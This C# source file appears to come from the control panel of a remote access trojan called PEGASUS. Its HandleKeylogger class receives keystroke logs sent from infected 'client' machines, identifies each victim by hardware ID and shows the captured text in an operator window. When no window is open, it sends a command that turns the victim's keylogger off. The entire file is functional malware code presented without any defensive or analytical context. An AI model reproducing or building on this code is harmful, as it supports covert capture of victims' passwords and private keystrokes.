namespace PEGASUS.BytesInOut
{
    using PEGASUS.Design;
    using PEGASUS.Diadyktio;
    using PEGASUS.Metafora_Dedomenon;
    using System.Windows.Forms;

    /// <summary>
    /// Defines the <see cref="HandleKeylogger" />.
    /// </summary>
    internal class HandleKeylogger
    {
        /// <summary>
        /// Initializes a new instance of the <see cref="HandleKeylogger"/> class.
        /// </summary>
        /// <param name="client">The client<see cref="Clients"/>.</param>
        /// <param name="unpack_msgpack">The unpack_msgpack<see cref="MsgPack"/>.</param>
        public HandleKeylogger(Clients client, MsgPack unpack_msgpack)
        {
            try
            {
                var KL = (FormKeylogger)Application.OpenForms[
                    "keyLogger:" + unpack_msgpack.ForcePathObject("Hwid").GetAsString()];
                if (KL != null)
                {
                    if (KL.Client == null)
                    {
                        KL.Client = client;
                        KL.timer1.Enabled = true;
                    }

                    KL.Sb.Append(unpack_msgpack.ForcePathObject("Log").GetAsString());
                    KL.richTextBox1.Text = KL.Sb.ToString();
                    KL.richTextBox1.SelectionStart = KL.richTextBox1.TextLength;
                    KL.richTextBox1.ScrollToCaret();
                }
                else
                {
                    var msgpack = new MsgPack();
                    msgpack.ForcePathObject("Pac_ket").AsString = "keyLogger";
                    msgpack.ForcePathObject("isON").AsString = "false";
                    client.Send(msgpack.Encode2Bytes());
                }
            }
            catch
            {
            }
        }
    }
}
